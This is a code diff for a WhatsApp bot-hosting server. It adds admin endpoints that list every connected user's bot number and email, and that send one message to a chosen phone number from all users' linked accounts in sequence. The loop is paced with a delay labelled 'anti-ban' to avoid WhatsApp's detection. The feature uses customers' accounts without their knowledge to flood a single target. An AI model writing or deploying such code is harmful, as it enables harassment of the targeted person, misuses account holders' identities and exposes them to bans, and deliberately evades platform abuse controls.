@@ -524,6 +524,122 @@ app.get('/api/media/:sessionId/:messageId', async (req, res) => {
     }
 });
 
+// ─── ADMIN AUTOMATION ENGINE ────────────────────────────────────────────────
+
+// GET /api/admin/automation/stats (Get active bot counts for automation)
+app.get('/api/admin/automation/stats', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden. Admin access required.' });
+
+    try {
+        const users = await UserModel.find({ status: 'active' }, { password: 0 }).lean();
+        const connectedBots = [];
+
+        for (const user of users) {
+            const userId = user._id.toString();
+            const sock = activeSessions.get(userId);
+            if (sock && sock.user && sock.user.id) {
+                const botNumber = sock.user.id.split(':')[0].split('@')[0];
+                connectedBots.push({
+                    userId,
+                    email: user.email,
+                    botNumber,
+                    connectedAt: user.createdAt
+                });
+            }
+        }
+
+        res.json({
+            totalActiveUsers: users.length,
+            totalConnectedBots: connectedBots.length,
+            bots: connectedBots
+        });
+    } catch (err) {
+        console.error('Automation stats error:', err);
+        res.status(500).json({ error: 'Failed to fetch automation stats.' });
+    }
+});
+
+// POST /api/admin/automation/broadcast (Send message to target number from ALL active user bots)
+app.post('/api/admin/automation/broadcast', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden. Admin access required.' });
+
+    const { targetNumber, message, delaySeconds = 2 } = req.body;
+
+    if (!targetNumber || !targetNumber.trim()) {
+        return res.status(400).json({ error: 'Target phone number is required.' });
+    }
+    if (!message || !message.trim()) {
+        return res.status(400).json({ error: 'Message text is required.' });
+    }
+
+    const cleanPhone = targetNumber.replace(/\D/g, '');
+    if (cleanPhone.length < 10 || cleanPhone.length > 15) {
+        return res.status(400).json({ error: 'Invalid phone number format. Must be full international format (e.g. 923001234567).' });
+    }
+
+    const targetJid = `${cleanPhone}@s.whatsapp.net`;
+    const safeDelayMs = Math.max(1000, Math.min(10000, Number(delaySeconds) * 1000 || 2000));
+
+    try {
+        const users = await UserModel.find({ status: 'active' }).lean();
+        const results = [];
+        let successCount = 0;
+        let failCount = 0;
+
+        for (const user of users) {
+            const userId = user._id.toString();
+            const sock = activeSessions.get(userId);
+
+            if (sock && sock.user && sock.user.id) {
+                const botNumber = sock.user.id.split(':')[0].split('@')[0];
+                try {
+                    console.log(`[AUTOMATION] Sending from bot ${botNumber} to ${targetJid}...`);
+                    await sock.sendMessage(targetJid, { text: message.trim() });
+
+                    results.push({
+                        userId,
+                        email: user.email,
+                        botNumber,
+                        target: cleanPhone,
+                        status: 'sent',
+                        timestamp: new Date()
+                    });
+                    successCount++;
+                } catch (sendErr) {
+                    console.error(`[AUTOMATION ERROR] Failed sending from bot ${botNumber}:`, sendErr.message);
+                    results.push({
+                        userId,
+                        email: user.email,
+                        botNumber,
+                        target: cleanPhone,
+                        status: 'failed',
+                        error: sendErr.message || 'Send failed',
+                        timestamp: new Date()
+                    });
+                    failCount++;
+                }
+
+                // Anti-ban safe delay between bot sends
+                await new Promise(r => setTimeout(r, safeDelayMs));
+            }
+        }
+
+        res.json({
+            message: `Broadcast finished. Sent from ${successCount} bot(s), ${failCount} failed.`,
+            summary: {
+                totalBotsFound: results.length,
+                successful: successCount,
+                failed: failCount,
+                target: cleanPhone
+            },
+            results
+        });
+    } catch (err) {
+        console.error('Automation broadcast error:', err);
+        res.status(500).json({ error: 'Broadcast execution failed: ' + err.message });
+    }
+});
+
 // ─── SESSION ENGINE ───────────────────────────────────────────────────────────
 
 const pendingQRs = new Map();
